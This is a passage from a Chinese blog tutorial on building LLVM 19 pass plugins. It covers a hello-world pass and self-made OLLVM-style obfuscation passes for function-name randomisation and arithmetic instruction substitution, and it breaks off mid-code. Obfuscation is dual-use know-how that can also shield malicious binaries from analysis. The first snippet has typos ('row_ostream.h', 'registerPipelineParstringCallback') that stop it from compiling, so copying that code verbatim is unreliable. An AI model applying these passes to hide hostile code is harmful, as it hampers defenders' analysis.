class="hljs-string">&quot;llvm/Support/row_ostream.h&quot;</span> <span class="hljs-comment">//引入了输出流库</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> llvm;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">HelloPass</span> : <span class="hljs-keyword">public</span> PassInfoMixin&lt;HelloPass&gt;<br>&#123;<br>    <span class="hljs-comment">// 定义了一个名为 HelloPass 的结构体，继承自 PassInfoMixin ，能自动提供一些基础功能</span><br>    <span class="hljs-function">PreservedAnalyses <span class="hljs-title">run</span><span class="hljs-params">(Function &amp;F, FunctionAnalysisManager &amp;AM)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// Pass 核心函数</span><br>        <span class="hljs-built_in">errs</span>() &lt;&lt; <span class="hljs-string">&quot;Hello from LLVM 19:&quot;</span> &lt;&lt; F.<span class="hljs-built_in">getName</span>() &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>        <span class="hljs-comment">// F.getName() 获取当前函数的名称，并输出到错误流</span><br>        <span class="hljs-keyword">return</span> PreservedAnalyses::<span class="hljs-built_in">all</span>();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">bool</span> <span class="hljs-title">isRequired</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; &#125;<br>    <span class="hljs-comment">// 表明这个函数是必需的，无论优化级别如何都不会被跳过</span><br>&#125;;<br><br><span class="hljs-comment">// 插件注册</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> LLVM_ATTRIBUTE_WEAK ::llvm::PassPluginLibraryInfo<br><span class="hljs-comment">// LLVM_ATTRIBUTE_WEAK 标记该函数为一个“弱符号”，在链接时允许多个库定义同名的函数而不会产生冲突</span><br><span class="hljs-built_in">llvmGetPassPluginInfo</span>()<br>&#123;<br>    <span class="hljs-comment">// LLVM 插件的入口函数</span><br>    <span class="hljs-keyword">return</span> &#123;<br>        .APIVersion = LLVM_PLUGIN_API_VERSION,<br>        .PluginName = <span class="hljs-string">&quot;HelloPass&quot;</span>, <span class="hljs-comment">// 插件名称</span><br>        .PluginVersion = <span class="hljs-string">&quot;v0.1&quot;</span>,<br>        .RegisterPassBuilderCallbacks = [](PassBuilder &amp;PB)<br>        &#123;<br>            PB.<span class="hljs-built_in">registerPipelineParstringCallback</span>(<br>                [](StringRef Name, FunctionPassManager &amp;FPM,<br>                   ArrayRef&lt;PassBuilder::PipelineElement&gt;)<br>                &#123;<br>                    <span class="hljs-keyword">if</span> (Name == <span class="hljs-string">&quot;hello&quot;</span>)<br>                    &#123; <span class="hljs-comment">// passname</span><br>                        FPM.<span class="hljs-built_in">addPass</span>(HelloPass&#123;&#125;);<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// 如果名称匹配，添加 HelloPass 到 FunctionPassManager</span><br>                    &#125;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;);<br>        &#125;&#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译 LLVM Pass</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">clang++-18 -shared -fPIC `llvm-config-19 --cxxflags` -o HelloPass.so Hello.cpp<br></code></pre></td></tr></table></figure><blockquote><p>clang++ 是 C++ 编译器，18是 clang 版本<br>-shared 告诉编译器和连接器创建一个共享库(动态链接库)<br>-fPIC Position-Independent Code,位置无关代码，创建共享库是个标志这是必需的<br>&#96;llvm-config-19 –cxxflags&#96; 确保编译器可以找到LLVM pass所依赖的所有头文件</p><blockquote><p>前半部分查询 LLVM 配置信息，19 是LLVM 版本<br>后半部分的–cxxflags 参数让 llvm-config-19 输出编译C++代码时需要的标志<br>-o HelloPass.so 指定生成共享库的名字</p></blockquote></blockquote><p>准备一个测试文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//test1.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello, World!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a + b;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">subtract</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a - b;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>编译成 .ll 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">clang -emit-llvm -S test1.c -o test1.ll<br></code></pre></td></tr></table></figure><p>用 opt 执行 Pass</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">opt -load-pass-plugin=./HelloPass.so -passes=<span class="hljs-string">&quot;hello&quot;</span> ./test1.ll -disable-output<br></code></pre></td></tr></table></figure><blockquote><p>HelloPass.so 是共享库文件 hello 是 pass 名称<br>在默认情况下，opt 会将经过pass处理后的LLVM IR输出到标准输出,-disable-output 能禁止该行为<br>输出</p></blockquote><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Hello <span class="hljs-built_in">from</span> LLVM <span class="hljs-number">19</span>: main<br>Hello <span class="hljs-built_in">from</span> LLVM <span class="hljs-number">19</span>: <span class="hljs-built_in">add</span><br>Hello <span class="hljs-built_in">from</span> LLVM <span class="hljs-number">19</span>: <span class="hljs-built_in">subtract</span><br></code></pre></td></tr></table></figure><h3 id="混淆–自实现-OLLVM"><a href="#混淆–自实现-OLLVM" class="headerlink" title="混淆–自实现 OLLVM"></a>混淆–自实现 OLLVM</h3><h4 id="符号混淆"><a href="#符号混淆" class="headerlink" title="符号混淆"></a>符号混淆</h4><p>写了一个实现混淆函数名的 pass，把自定义的函数名都变成随机生成的名字</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//obf.cpp</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/IR/PassManager.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Passes/PassPlugin.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Passes/PassBuilder.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/IR/Module.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/IR/Function.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;random&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;set&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> llvm;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">SymbolReplacePass</span> : <span class="hljs-keyword">public</span> PassInfoMixin&lt;SymbolReplacePass&gt;<br>&#123;<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-function">std::string <span class="hljs-title">generateRandomName</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-type">static</span> std::random_device rd;<br>        <span class="hljs-function"><span class="hljs-type">static</span> std::mt19937 <span class="hljs-title">gen</span><span class="hljs-params">(rd())</span></span>;<br>        <span class="hljs-type">static</span> std::uniform_int_distribution&lt;&gt; <span class="hljs-built_in">dis</span>(<span class="hljs-number">0</span>, <span class="hljs-number">25</span>);<br><br>        std::string name;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; ++i)<br>        &#123;<br>            name += (<span class="hljs-string">&#x27;a&#x27;</span> + <span class="hljs-built_in">dis</span>(gen));<br>        &#125;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">shouldObf</span><span class="hljs-params">(<span class="hljs-type">const</span> Function &amp;F)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (F.<span class="hljs-built_in">isDeclaration</span>())<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        StringRef name = F.<span class="hljs-built_in">getName</span>();<br><br>        std::set&lt;std::string&gt; preservedNames = &#123;<br>            <span class="hljs-string">&quot;main&quot;</span>,<br>            <span class="hljs-string">&quot;_start&quot;</span>,<br>            <span class="hljs-string">&quot;__libc_start_main&quot;</span>,<br>            <span class="hljs-string">&quot;printf&quot;</span>,<br>            <span class="hljs-string">&quot;scanf&quot;</span>,<br>            <span class="hljs-string">&quot;malloc&quot;</span>,<br>            <span class="hljs-string">&quot;free&quot;</span>,<br>            <span class="hljs-string">&quot;exit&quot;</span>&#125;;<br><br>        <span class="hljs-keyword">if</span> (name.<span class="hljs-built_in">starts_with</span>(<span class="hljs-string">&quot;_&quot;</span>) &amp;&amp; name != <span class="hljs-string">&quot;main&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;preserved : preservedNames)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (name == preserved)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">PreservedAnalyses <span class="hljs-title">run</span><span class="hljs-params">(Module &amp;M, ModuleAnalysisManager &amp;)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-type">bool</span> modified = <span class="hljs-literal">false</span>;<br>        std::vector&lt;Function *&gt; functionsToObf;<br>        <span class="hljs-keyword">for</span> (Function &amp;F : M)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">shouldObf</span>(F))<br>            &#123;<br>                functionsToObf.<span class="hljs-built_in">push_back</span>(&amp;F);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (Function *F : functionsToObf)<br>        &#123;<br>            std::string origName = F-&gt;<span class="hljs-built_in">getName</span>().<span class="hljs-built_in">str</span>();<br>            std::string newName = <span class="hljs-built_in">generateRandomName</span>();<br><br>            F-&gt;<span class="hljs-built_in">setName</span>(newName);<br>            <span class="hljs-built_in">errs</span>() &lt;&lt; <span class="hljs-string">&quot;[SymbolReplace] obfuscated : &quot;</span> &lt;&lt; origName &lt;&lt; <span class="hljs-string">&quot;-&gt;&quot;</span> &lt;&lt; newName &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>            modified = <span class="hljs-literal">true</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (modified)<br>        &#123;<br>            <span class="hljs-built_in">errs</span>() &lt;&lt; <span class="hljs-string">&quot;Total functions obfuscated:&quot;</span> &lt;&lt; functionsToObf.<span class="hljs-built_in">size</span>() &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> modified ? PreservedAnalyses::<span class="hljs-built_in">none</span>() : PreservedAnalyses::<span class="hljs-built_in">all</span>();<br>    &#125;<br>&#125;;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> LLVM_ATTRIBUTE_WEAK::<span class="hljs-function">llvm::PassPluginLibraryInfo <span class="hljs-title">llvmGetPassPluginInfo</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> &#123;<br>        .APIVersion = LLVM_PLUGIN_API_VERSION,<br>        .PluginName = <span class="hljs-string">&quot;SymbolReplacePass&quot;</span>,<br>        .PluginVersion = <span class="hljs-string">&quot;v0.1&quot;</span>,<br>        .RegisterPassBuilderCallbacks = [](PassBuilder &amp;PB)<br>        &#123;<br>            PB.<span class="hljs-built_in">registerPipelineParsingCallback</span>(<br>                [](StringRef Name, ModulePassManager &amp;MPM,<br>                   ArrayRef&lt;PassBuilder::PipelineElement&gt;)<br>                &#123;<br>                    <span class="hljs-keyword">if</span> (Name == <span class="hljs-string">&quot;symbol_replace&quot;</span>)<br>                    &#123;<br>                        MPM.<span class="hljs-built_in">addPass</span>(<span class="hljs-built_in">SymbolReplacePass</span>());<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>                    &#125;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;);<br>        &#125;<br><br>    &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>准备的测试文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//test2.c</span><br><span class="hljs-meta"># <span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">func1</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a + b;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">func2</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a - b;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">func3</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a * b;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    func1(<span class="hljs-number">7</span>,<span class="hljs-number">11</span>);<br>    func2(<span class="hljs-number">7</span>,<span class="hljs-number">11</span>);<br>    func3(<span class="hljs-number">7</span>,<span class="hljs-number">11</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;func1: %d\n&quot;</span>, func1(<span class="hljs-number">7</span>, <span class="hljs-number">11</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;func2: %d\n&quot;</span>, func2(<span class="hljs-number">7</span>, <span class="hljs-number">11</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;func3: %d\n&quot;</span>, func3(<span class="hljs-number">7</span>, <span class="hljs-number">11</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译插件<br><code>clang++-18 -shared -fPIC</code>llvm-config-19 –cxxflags<code> -o SymbolReplacePass.so obf.cpp</code></p><p>生成 .ll 文件<br><code>clang -emit-llvm -S test2.c -o test2.ll</code></p><p>进行全函数混淆<br><code>opt -load-pass-plugin=./SymbolReplacePass.so -passes=symbol_replace test2.ll -S -o afterObf_test2.ll</code><br>可以看到输出</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xl">[S<span class="hljs-function"><span class="hljs-title">ymbolReplace</span>] obfuscated : func1-&gt;</span>sgwvbkay<br>[S<span class="hljs-function"><span class="hljs-title">ymbolReplace</span>] obfuscated : func2-&gt;</span>lwhtbjkx<br>[S<span class="hljs-function"><span class="hljs-title">ymbolReplace</span>] obfuscated : func3-&gt;</span>cfjkyqtx<br>Total functions obfuscated:<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>编译最终程序<br><code>clang afterObf_test2.ll -o afterObf_test2</code></p><p>用 ida 查看混淆前后的程序，对比</p><p>混淆前：</p><p><img src="/../images/LLVM/v1.png"></p><p>混淆后：</p><p><img src="/../images/LLVM/v2.png"></p><h4 id="指令替换"><a href="#指令替换" class="headerlink" title="指令替换"></a>指令替换</h4><p>自实现指令混淆的 pass</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//sub.cpp</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/IR/PassManager.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Passes/PassPlugin.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Passes/PassBuilder.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/IR/Module.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/IR/Function.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/IR/BasicBlock.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/IR/Instructions.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;random&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> llvm;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">InstructionSubstitutionPass</span> : <span class="hljs-keyword">public</span> PassInfoMixin&lt;InstructionSubstitutionPass&gt;<br>&#123;<br><span class="hljs-keyword">private</span>:<br>    std::mt19937 rng;<br><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getRandomInt</span><span class="hljs-params">(<span class="hljs-type">int</span> max)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-function">std::uniform_int_distribution&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">dist</span><span class="hljs-params">(<span class="hljs-number">0</span>, max - <span class="hljs-number">1</span>)</span></span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">dist</span>(rng);<br>    &#125;<br><br>    <span class="hljs-comment">// a + b =&gt; (a ^ b) + 2 * (a &amp; b)</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">substituteAdd</span><span class="hljs-params">(BinaryOperator *addInst)</span></span><br><span class="hljs-function">    </span>&#123;<br>        IRBuilder&lt;&gt; <span class="hljs-built_in">builder</span>(addInst);<br>        Value *op1 = addInst-&gt;<span class="hljs-built_in">getOperand</span>(<span class="hljs-number">0</span>);<br>        Value *op2 = addInst-&gt;<span class="hljs-built_in">getOperand</span>(<span class="hljs-number">1</span>);<br><br>        <span class="hljs-comment">//虚假计算</span><br>        Value *dummy = builder.<span class="hljs-built_in">CreateMul</span>(op1, ConstantInt::<span class="hljs-built_in">get</span>(op1-&gt;<span class="hljs-built_in">getType</span>(), <span class="hljs-number">1</span>), <span class="hljs-string">&quot;dummy&quot;</span>);<br><br>        <span class="hljs-comment">// a ^ b</span><br>        Value *xorResult = builder.<span class="hljs-built_in">CreateXor</span>(op1, op2, <span class="hljs-string">&quot;xor_tmp&quot;</span>);<br>        <span class="hljs-comment">// a &amp; b</span><br>        Value *andResult = builder.<span class="hljs-built_in">CreateAnd</span>(op1, op2, <span class="hljs-string">&quot;and_tmp&quot;</span>);<br>        <span class="hljs-comment">// 2 * ( a &amp; b)</span><br>        Value *shiftResult = builder.<span class="hljs-built_in">CreateShl</span>(andResult, <span class="hljs-number">1</span>, <span class="hljs-string">&quot;shift_tmp&quot;</span>);<br>        <span class="hljs-comment">//(a + b) + 2 * (a &amp; b)</span><br>        Value *addResult = builder.<span class="hljs-built_in">CreateAdd</span>(xorResult, shiftResult, <span class="hljs-string">&quot;add_subst&quot;</span>);<br><br>        <span class="hljs-comment">//异或 0 